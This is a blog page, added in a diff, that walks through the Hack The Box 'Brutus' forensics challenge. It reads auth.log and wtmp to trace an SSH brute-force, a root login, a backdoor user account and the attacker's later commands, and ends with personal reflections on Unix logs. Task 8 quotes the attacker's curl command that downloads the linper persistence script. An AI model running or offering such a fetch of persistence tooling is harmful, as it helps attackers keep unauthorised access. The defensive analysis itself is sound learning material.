@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>HTB: Brutus | Vedika Bang</title>
+<meta name="keywords" content="DFIR, Sherlock">
+<meta name="description" content="Baby now we got bad logs, but I can fix &#39;em all!">
+<meta name="author" content="Vedika Bang">
+<link rel="canonical" href="http://localhost:1313/sherlock.md/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.4a46afba4eec3cfb36722d5647a30e86033b9772071b1975a4528ce060dc40e0.css" integrity="sha256-Skavuk7sPPs2ci1WR6MOhgM7l3IHGxl1pFKM4GDcQOA=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/sherlock.md/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="HTB: Brutus" />
+<meta property="og:description" content="Baby now we got bad logs, but I can fix &#39;em all!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/sherlock.md/" />
+<meta property="og:image" content="http://localhost:1313/sherlock.png" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2024-03-24T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-03-24T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/sherlock.png" />
+<meta name="twitter:title" content="HTB: Brutus"/>
+<meta name="twitter:description" content="Baby now we got bad logs, but I can fix &#39;em all!"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HTB: Brutus",
+      "item": "http://localhost:1313/sherlock.md/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Brutus",
+  "name": "HTB: Brutus",
+  "description": "Baby now we got bad logs, but I can fix 'em all!",
+  "keywords": [
+    "DFIR", "Sherlock"
+  ],
+  "articleBody": " Brutus Write-up Summary: we’ll look into Unix auth.log and wtmp logs. A Confluence server got brute-forced through SSH, and we’ll track what the attacker did using auth.log. We’ll see how this log can show us brute-force attempts, privilege escalation, persistence, and even some command execution. Pawned Brutus Reconnaisance We’re given two log files. auth.log and wtmp.log. It is important to understand the structure of logs to process them. auth.log : The auth.log file is where your system keeps track of all the stuff related to logging in and out. It’s super useful for keeping an eye on who’s trying to get into your system, whether they’re successful or not. You can find records of users logging in, failed login attempts, and other authentication events. It’s basically a way to monitor and audit what’s happening with user access on your linux sysytem. after wc -ling we can see it got 385 lines. First, I needed to know what the structure looks like. |\u003c Hostname \u003e|[Process ID]| PAM Module Message at 6:18 AM on March 6, the CRON service on the server ip-172-31-35-28 started a new session for the user confluence (who has the user ID 998). This action was handled by the pam_unix module and was initiated by the root user (user ID 0) wtmp: This file logs a record of all login and logout events, including when the system boots and shuts down. It is part of utmp, btmp, wtmp log files. The structure of wtmp is rather easier to understand.\n[Type of record]|[PID]|[Terminal]|[Username]|[Hostname]|[relavant system info]|||\nincludes USER_PROCESS for logins, DEAD_PROCESS for logouts, BOOT_TIME for system boots. This log can be viewed by last or utmpdump\nBoth of these logs are literal example of same same, but different different. auth.log is more verbose than wtmp logs. This file logs authentication events as they happen, so you can see what’s going on right now (real-time). However, it also keeps a record of past events, making it useful for reviewing historical data. wtmp file logs a record of all login and logout events, including when the system boots and shuts down.\nTask 1 This is where it gets intersting. Honestly, you can either gawk at these logs and get the answers, or can use small bash scripts to parse these logs effectively. We’ve to analyze the auth.log, to identify the IP address used by the attacker to carry out a brute force attack. Brute-force literally screams try-error/ failed-successful attempts.\nfirst, I wrote a command to simplify logs for myself, tbh, these logs don’t have consistency so they were a bit tedious to get grep-fied / awk -fied. However, just by looking at the logs I could tell Failed password is for failed attempt and vice versa. Howveer, figuring our fields took longer than I anticipated.\ncut used to extract specific fields from each line of text. -d specifies the delimiter. -f 6 specifies number of the field that we want. Pipe that o/p tp process further to get the part before the [ character. sort sorts it alphabetically and returns counted occureneces in reversed. There was a bit of inconsistency with spaces, but this command returned all the services that were invoked. always use awk to print out number of field. For the answer, I need to look into Failed attempts. I think it is obvious that 65.2.161.68 is the attacker’s IP address and he attempted 5 usernames, and ended up getting two right. Task 1: 65.2.161.68\nTask 2 At this point, it is quite evident that the account that’s been brute-forced is root. There are total 4 succesful attempts. two from the attacker’s IP address, and we’ll talk about rest of them later.\nTask 2: root\nTask 3 wtmp logs are easy to read. as mentioned above, the first field is typically type of record, and after a bit of googling, [7] is usual user activity. and we can tell attacker logging in as root from the attacker’s IP at 06:32:45.\nTask 3: 2024-03-06 06:32:45\nTask 4 This is actually pretty neat; because after the first “successful login” which also lasted for longer time for quite some time - we can see session number was asiigned to it and coection was establised right after; unlike previous attempts. note, this estalised connection is one second earlier than login stamp of wtmp.\nTask 4: 37\nTask 5 Alright, after gaining access, the attacker quickly moved to create persistence by adding an account. This is quite evident from the different services that were invoked during the session (told you, auth.log is quite verbose!)\nSo – (that’s how all the interesting stories start xD) On March 6 At 06:34:18, attacker got in and created a new group called cyberjunkie with the GID of 1002, adding it into /etc/group and /etc/gshadow. This group creation was a setup for what was coming next. Without wasting any time, they attacker created a new user named cyberjunkie (UID=1002, GID=1002) at the same moment, setting up this user with a home directory at /home/cyberjunkie and gave it a default shell of /bin/bash, laying the groundwork for persistence on the system.\nJust eight seconds later, at 06:34:26, attacker locked in the access by setting a password for cyberjunkie. To finalize their foothold, attacker updated the user information at 06:34:31, ensuring everything was in place for their new account.\nIn a matter of seconds, the attacker had established a persistent user account, likely to come back later without raising too many alarms. Clever and quick!\nTask 5: cyberjunkie\nTask 6 I love MITRE! It’s pretty self-explanatory.\nTask 6: T1136.001\nTask 7 From Task3 and Task5 , we can see after adding the user to su, the connection was disconnected. So, the difference between 06:32:45 and 06:37:24 is indeed 279 seconds.\nTask 7: 279\nTask 8 From auth.log trail, logs indicate that the cyberjunkie user successfully used sudo to cat the /etc/shadow to the terminal, further downloaded the linper script from github.\nTask 8: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh I did some digging and found that linper script is for detecting and creating persistence mechanisms on Linux systems. Well, that was a weak cliffhanger :/\nMy Love-Hate Relationship with Unix Logs As an aspiring Threat Hunter, a strong and positive relationship with Unix logs is essential. Legends say that Linux logs are the bread and butter of every seasoned Linux pro and a CTF player. I wholeheartedly agree with the latter, having experienced it firsthand.\nThere are different kinds of logs, and while I’m not sure if I have a favorite one, each has its unique challenges and lessons. Earlier this month, I found myself analysing vbox.logs and application-specific logs. After spending n hours and enduring one VirtualBox crash, I discovered that the kernel version 6.8.0 wasn’t compatible with VirtualBox 7.0.14. Downgrading the kernel version on a fresh copy of Ubuntu wasn’t straightforward, with Unix logs prompting all sorts of unconventional tasks. Honestly, logs didn’t help much except error logging actually helped me find a solution. I could write chronicles about my experiences with VMs and various fiascos, but I’ve always viewed these challenges as valuable learning opportunities (I, truly, have.). In this case, reconnaissance proved to be extremely important and a significant time-saver.\nDespite the frustrations, I love the open-source community. Knowing that I’m not alone in my struggles is oddly comforting, especially after an exhausting, sleepless eight-hour debugging session.\nWhy don’t you look into logs? During my internship at Aon, I worked closely with logs—Windows logs, to be precise. This experience helped me understand Windows log analysis and showed me how much easier it is to deal with Windows logs compared to Unix logs. I once read someone say, “Linux is free if your time is worthless.” While this statement might elicit a smirk of pained recognition, it underscores the complexity and depth of knowledge required for Unix logs, which is exactly why I want to learn more about them.\nSee, I told ya - logs have it all, Or do they? Log files are everything! You upload them when you create an issue, analyze them when solving someone else’s issue, and deep dive into them when working as a consultant. Fortunately, there are amazing SIEM tools available to make this process seemingly easier.\nLinux log names are often more intuitive than the information they contain. After sifting through countless logs, I’ve realized that in Linux, there is no uniform logging format for programs. Each program logs in its own way, to its own file. There’s no “all-in-one” kind of log. You might find yourself ‘cat’-ing through files that aren’t pertinent to what you’re looking for.\nInitially, I was intimidated by text-based logs. It seemed daunting to know what every entry meant unless I spent all day looking at logs. However, I soon learned that you don’t need to know everything. It’s crucial to know what you’re looking for. This makes it easier to grep the relevant information. Logs provide context and metadata, but, as people say, “ask the right questions.” A little understanding of what you’re looking for goes a long way; otherwise, it’s just another frustrating day at the office.\n",
+  "wordCount" : "1522",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/sherlock.png","datePublished": "2024-03-24T00:00:00Z",
+  "dateModified": "2024-03-24T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Vedika Bang"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/sherlock.md/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Vedika Bang",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          
+          
+          delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '$', right: '$', display: false},
+            {left: "\\begin{equation}", right: "\\end{equation}", display: true},
+            {left: "\\begin{equation*}", right: "\\end{equation*}", display: true},
+            {left: "\\begin{align}", right: "\\end{align}", display: true},
+            {left: "\\begin{align*}", right: "\\end{align*}", display: true},
+            {left: "\\begin{alignat}", right: "\\end{alignat}", display: true},
+            {left: "\\begin{gather}", right: "\\end{gather}", display: true},
+            {left: "\\begin{CD}", right: "\\end{CD}", display: true},
+          ],
+          
+          throwOnError : false
+        });
+    });
+</script>
+ 
+
+
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Vedika Bang">
+             
+                <img src="http://localhost:1313/favicon.ico" alt="" aria-label="logo"
+                    height="18"
+                    width="18">Vedika Bang</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/education/" title="Education">
+                    <span>Education</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/experience/" title="Experience">
+                    <span>Experience</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+    <main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      HTB: Brutus
+    </h1>
+    <div class="post-meta">
+
+<div>
+    
+    
+    
+    
+</div>
+
+
+
+
+
+
+
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#brutus" aria-label="Brutus">Brutus</a><ul>
+                        
+                <li>
+                    <a href="#write-up" aria-label="Write-up">Write-up</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#reconnaisance" aria-label="Reconnaisance">Reconnaisance</a></li>
+                <li>
+                    <a href="#task-1" aria-label="Task 1">Task 1</a></li>
+                <li>
+                    <a href="#task-2" aria-label="Task 2">Task 2</a></li>
+                <li>
+                    <a href="#task-3" aria-label="Task 3">Task 3</a></li>
+                <li>
+                    <a href="#task-4" aria-label="Task 4">Task 4</a></li>
+                <li>
+                    <a href="#task-5" aria-label="Task 5">Task 5</a></li>
+                <li>
+                    <a href="#task-6" aria-label="Task 6">Task 6</a></li>
+                <li>
+                    <a href="#task-7" aria-label="Task 7">Task 7</a></li>
+                <li>
+                    <a href="#task-8" aria-label="Task 8">Task 8</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#my-love-hate-relationship-with-unix-logs" aria-label="My Love-Hate Relationship with Unix Logs">My Love-Hate Relationship with Unix Logs</a></li>
+                <li>
+                    <a href="#why-dont-you-look-into-logs" aria-label="Why don&amp;rsquo;t you look into logs?">Why don&rsquo;t you look into logs?</a></li>
+                <li>
+                    <a href="#see-i-told-ya---logs-have-it-all-or-do-they" aria-label="See, I told ya - logs have it all, Or do they?">See, I told ya - logs have it all, Or do they?</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><div style="font-family: 'Times New Roman', serif; text-align: justify;">
+<h2 id="brutus">Brutus<a hidden class="anchor" aria-hidden="true" href="#brutus">#</a></h2>
+<h3 id="write-up">Write-up<a hidden class="anchor" aria-hidden="true" href="#write-up">#</a></h3>
+<blockquote>
+<p>Summary: we&rsquo;ll look into Unix auth.log and wtmp logs. A Confluence server got brute-forced through SSH, and we&rsquo;ll track what the attacker did using auth.log. We&rsquo;ll see how this log can show us brute-force attempts, privilege escalation, persistence, and even some command execution. <a href="https://labs.hackthebox.com/achievement/sherlock/1713677/631" target="_blank">Pawned Brutus</a>
+</p>
+</blockquote>
+<h5 id="reconnaisance">Reconnaisance<a hidden class="anchor" aria-hidden="true" href="#reconnaisance">#</a></h5>
+<p>We&rsquo;re given two log files. auth.log and wtmp.log. It is important to understand the structure of logs to process them.<img loading="lazy" src="/ls-al.png" alt="Files"  />
+</p>
+<p><code>auth.log </code>: The auth.log file is where your system keeps track of all the stuff related to logging in and out. It&rsquo;s super useful for keeping an eye on who’s trying to get into your system, whether they&rsquo;re successful or not. You can find records of users logging in, failed login attempts, and other authentication events. It’s basically a way to monitor and audit what&rsquo;s happening with user access on your linux sysytem.
+<img loading="lazy" src="/catauth.png" alt="auth.log"  />
+</p>
+<ul>
+<li>after <code>wc -l</code>ing we can see it got 385 lines. First, I needed to know what the structure looks like.</li>
+<li><code>&lt;Date and Time&gt;|&lt; Hostname &gt;|&lt;Service Name&gt;[Process ID]| PAM Module Message </code></li>
+<li>at 6:18 AM on March 6, the CRON service on the server ip-172-31-35-28 started a new session for the user confluence (who has the user ID 998). This action was handled by the pam_unix module and was initiated by the root user (user ID 0)</li>
+</ul>
+<p><code>wtmp</code>: This file logs a record of all login and logout events, including when the system boots and shuts down. It is part of utmp, btmp, wtmp log files.
+<img loading="lazy" src="/wtmp.png" alt="wtmp logs"  />
+</p>
+<ul>
+<li>
+<p>The structure of wtmp is rather easier to understand.</p>
+</li>
+<li>
+<p><code>[Type of record]|[PID]|[Terminal]|[Username]|[Hostname]|[relavant system info]|&lt;Ip address&gt;|&lt;timestamp&gt;|</code></p>
+</li>
+<li>
+<p>includes <code>USER_PROCESS</code> for logins, <code>DEAD_PROCESS</code> for logouts, <code>BOOT_TIME</code> for system boots. This log can be viewed by <code>last</code> or <code>utmpdump</code></p>
+<blockquote>
+<p>Both of these logs are literal example of same same, but different different. <code>auth.log</code> is more verbose than wtmp logs. This file logs authentication events as they happen, so you can see what&rsquo;s going on right now (real-time). However, it also keeps a record of past events, making it useful for reviewing historical data. <code>wtmp</code> file logs a record of all login and logout events, including when the system boots and shuts down.</p>
+</blockquote>
+</li>
+</ul>
+<h5 id="task-1">Task 1<a hidden class="anchor" aria-hidden="true" href="#task-1">#</a></h5>
+<p>This is where it gets intersting. Honestly, you can either gawk at these logs and get the answers, or can use small bash scripts to parse these logs effectively. We&rsquo;ve to analyze the auth.log, to identify the IP address used by the attacker to carry out a brute force attack. Brute-force literally screams try-error/ failed-successful attempts.</p>
+<p>first, I wrote a command to simplify logs for myself, tbh, these logs don&rsquo;t have consistency so they were a bit tedious to get grep-fied / awk -fied. However, just by looking at the logs I could tell Failed password is for failed attempt and vice versa. Howveer, figuring our fields took longer than I anticipated.</p>
+<p><img loading="lazy" src="/fullcommand.png" alt="cut"  />
+</p>
+<ul>
+<li><code>cut</code> used to extract specific fields from each line of text. <code>-d</code> specifies the delimiter. <code>-f 6</code> specifies number of the field that we want. Pipe that o/p tp process further to get the part before the <code>[</code> character. <code>sort</code> sorts it alphabetically and returns counted occureneces in reversed. There was a bit of inconsistency with spaces, but this command returned all the services that were invoked.</li>
+<li>always use <code>awk</code> to print out number of field.</li>
+</ul>
+<p>For the answer, I need to look into Failed attempts. I think it is obvious that <code> 65.2.161.68</code> is the attacker&rsquo;s IP address and he attempted 5 usernames, and ended up getting two right.
+<img loading="lazy" src="/failedgrep.png" alt="failed_attempts"  />
+</p>
+<blockquote>
+<p>Task 1: 65.2.161.68</p>
+</blockquote>
+<h5 id="task-2">Task 2<a hidden class="anchor" aria-hidden="true" href="#task-2">#</a></h5>
+<p>At this point, it is quite evident that the account that&rsquo;s been brute-forced is <code>root</code>. There are total 4 succesful attempts. two from  the attacker&rsquo;s IP address, and we&rsquo;ll talk about rest of them later.</p>
+<p><img loading="lazy" src="/ssh.png" alt="failed_attempts"  />
+</p>
+<blockquote>
+<p>Task 2: root</p>
+</blockquote>
+<h5 id="task-3">Task 3<a hidden class="anchor" aria-hidden="true" href="#task-3">#</a></h5>
+<p><code>wtmp</code> logs are easy to read. as mentioned above, the first field is typically type of record, and after a bit of googling, [7] is usual user activity. and we can tell attacker logging in as root from the attacker’s IP at 06:32:45.</p>
+<p><img loading="lazy" src="/wtmp.png" alt="failed_attempts"  />
+</p>
+<blockquote>
+<p>Task 3: 2024-03-06 06:32:45</p>
+</blockquote>
+<h5 id="task-4">Task 4<a hidden class="anchor" aria-hidden="true" href="#task-4">#</a></h5>
+<p>This is actually pretty neat; because after the first &ldquo;successful login&rdquo; which also lasted for longer time for quite some time - we can see session number was asiigned to it and coection was establised right after; unlike previous attempts. note, this estalised connection is one second earlier than login stamp of wtmp.</p>
+<p><img loading="lazy" src="/port37.png" alt="failed_attempts"  />
+</p>
+<blockquote>
+<p>Task 4: 37</p>
+</blockquote>
+<h5 id="task-5">Task 5<a hidden class="anchor" aria-hidden="true" href="#task-5">#</a></h5>
+<p>Alright, after gaining access, the attacker quickly moved to create persistence by adding an account. This is quite evident from the different services that were invoked during the session (told you, auth.log is quite verbose!)</p>
+<p>So &ndash; (that&rsquo;s how all the interesting stories start xD) On March 6 At 06:34:18, attacker got in and created a new group called cyberjunkie with the GID of 1002, adding it into /etc/group and /etc/gshadow. This group creation was a setup for what was coming next.  Without wasting any time, they attacker created a new user named <code>cyberjunkie</code> (UID=1002, GID=1002) at the same moment, setting up this user with a home directory at /home/cyberjunkie and gave it a default shell of /bin/bash, laying the groundwork for persistence on the system.</p>
+<p>Just eight seconds later, at 06:34:26, attacker locked in the access by setting a password for cyberjunkie. To finalize their foothold, attacker updated the user information at 06:34:31, ensuring everything was in place for their new account.</p>
+<p>In a matter of seconds, the attacker had established a persistent user account, likely to come back later without raising too many alarms. Clever and quick!</p>
+<p><img loading="lazy" src="/whathedid.png" alt="failed_attempts"  />
+</p>
+<blockquote>
+<p>Task 5: cyberjunkie</p>
+</blockquote>
+<h5 id="task-6">Task 6<a hidden class="anchor" aria-hidden="true" href="#task-6">#</a></h5>
+<p>I love MITRE! It&rsquo;s pretty self-explanatory.</p>
+<p><img loading="lazy" src="/mitre.png" alt="failed_attempts"  />
+</p>
+<blockquote>
+<p>Task 6: T1136.001</p>
+</blockquote>
+<h5 id="task-7">Task 7<a hidden class="anchor" aria-hidden="true" href="#task-7">#</a></h5>
+<p>From <a href="http://localhost:1313/sherlock.md/#task-3" target="_blank">Task3</a>
+ and <a href="">Task5</a>
+, we can see after adding the user to <code>su</code>, the connection was disconnected. So, the difference between 06:32:45 and 06:37:24 is indeed 279 seconds.</p>
+<blockquote>
+<p>Task 7: 279</p>
+</blockquote>
+<h5 id="task-8">Task 8<a hidden class="anchor" aria-hidden="true" href="#task-8">#</a></h5>
+<p>From auth.log trail, logs indicate that the <code>cyberjunkie</code> user successfully used sudo to cat the <code>/etc/shadow</code> to the terminal, further downloaded the linper script from github.</p>
+<blockquote>
+<p>Task 8: /usr/bin/curl <a href="https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh" target="_blank">https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</a>
+</p>
+</blockquote>
+<p>I did some digging and found that linper script is for detecting and creating persistence mechanisms on Linux systems. Well, that was a weak cliffhanger :/</p>
+<hr>
+<h3 id="my-love-hate-relationship-with-unix-logs">My Love-Hate Relationship with Unix Logs<a hidden class="anchor" aria-hidden="true" href="#my-love-hate-relationship-with-unix-logs">#</a></h3>
+<p>As an aspiring Threat Hunter, a strong and positive relationship with Unix logs is essential. Legends say that Linux logs are the bread and butter of every seasoned Linux pro and a CTF player. I wholeheartedly agree with the latter, having experienced it firsthand.</p>
+<p>There are different kinds of logs, and while I’m not sure if I have a favorite one, each has its unique challenges and lessons. Earlier this month, I found myself analysing vbox.logs and application-specific logs. After spending n hours and enduring one VirtualBox crash, <a href="https://forums.virtualbox.org/viewtopic.php?t=110882" target="_blank">I discovered that the kernel version 6.8.0 wasn’t compatible with VirtualBox 7.0.14. Downgrading the kernel version on a fresh copy of Ubuntu wasn’t straightforward, with Unix logs prompting all sorts of unconventional tasks.</a>
+ Honestly, logs didn&rsquo;t help much except error logging actually helped me find a solution. I could write chronicles about my experiences with VMs and various fiascos, but I’ve always viewed these challenges as valuable learning opportunities (I, truly, have.). In this case, reconnaissance proved to be extremely important and a significant time-saver.</p>
+<p>Despite the frustrations, I love the open-source community. Knowing that I’m not alone in my struggles is oddly comforting, especially after an exhausting, sleepless eight-hour debugging session.</p>
+<h3 id="why-dont-you-look-into-logs">Why don&rsquo;t you look into logs?<a hidden class="anchor" aria-hidden="true" href="#why-dont-you-look-into-logs">#</a></h3>
+<p>During my internship at Aon, I worked closely with logs—Windows logs, to be precise. This experience helped me understand Windows log analysis and showed me how much easier it is to deal with Windows logs compared to Unix logs. I once read someone say, &ldquo;Linux is free if your time is worthless.&rdquo; While this statement might elicit a smirk of pained recognition, it underscores the complexity and depth of knowledge required for Unix logs, which is exactly why I want to learn more about them.</p>
+<h3 id="see-i-told-ya---logs-have-it-all-or-do-they">See, I told ya - logs have it all, Or do they?<a hidden class="anchor" aria-hidden="true" href="#see-i-told-ya---logs-have-it-all-or-do-they">#</a></h3>
+<p>Log files are everything! You upload them when you create an issue, analyze them when solving someone else&rsquo;s issue, and deep dive into them when working as a consultant. Fortunately, there are amazing SIEM tools available to make this process seemingly easier.</p>
+<p>Linux log names are often more intuitive than the information they contain. After sifting through countless logs, I&rsquo;ve realized that in Linux, there is no uniform logging format for programs. Each program logs in its own way, to its own file. There&rsquo;s no &ldquo;all-in-one&rdquo; kind of log. You might find yourself  &lsquo;cat&rsquo;-ing through files that aren&rsquo;t pertinent to what you&rsquo;re looking for.</p>
+<p>Initially, I was intimidated by text-based logs. It seemed daunting to know what every entry meant unless I spent all day looking at logs. However, I soon learned that you don&rsquo;t need to know everything. It&rsquo;s crucial to know what you&rsquo;re looking for. This makes it easier to grep the relevant information. Logs provide context and metadata, but, as people say, &ldquo;ask the right questions.&rdquo; A little understanding of what you&rsquo;re looking for goes a long way; otherwise, it&rsquo;s just another frustrating day at the office.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/dfir/">DFIR</a></li>
+      <li><a href="http://localhost:1313/tags/sherlock/">Sherlock</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/natas.md/">
+    <span> &larr;&nbsp;OverTheWire: Natas</span>
+  </a>
+  <a class="next" href="http://localhost:1313/krypton.md/">
+    <span>OverTheWire : Krypton&nbsp;&rarr;</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+</html>
